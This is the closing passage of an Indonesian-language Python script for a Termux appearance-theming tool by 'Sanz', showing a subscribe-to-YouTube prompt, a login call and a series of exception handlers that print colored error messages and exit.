			print(f"{bx}Subrek dulu channel {p}YT Aing cuk{bx}!!");sleep(1)
			os.system(f"xdg-open {subrek_yt_free_tutorial}");sleep(10)
			Sanz()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}>{p}] Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n{p}[{m}!{p}] Server Error\n{p}[{m}!{p}] Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n{p}[{m}!{p}] Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

if __name__ == "__main__":
	try:
		___free_tutorial___ = "Tools Theme-Me, Tools Untuk Memperganteng Tampilan Termux by Sanz"
		_____sanz_____ = open("Sanz","w").write(___free_tutorial___)
		__sanz_login__()
	except KeyboardInterrupt:
		hapus();sleep(0.5)
		exit(f"\n {m}➤ {p}Program Dihentikan\n")
	except requests.exceptions.ConnectionError:
		hapus();sleep(0.5)
		exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
	except KeyError:
		hapus();sleep(0.5)
		exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
	except json.decoder.JSONDecodeError:
		hapus();sleep(0.5)
		exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
	except Exception as lol:
		to=f"\n {m}➤ {p}Error {m}: {p}"
		hapus();sleep(0.5)
		exit(f"{to}{lol}\n")

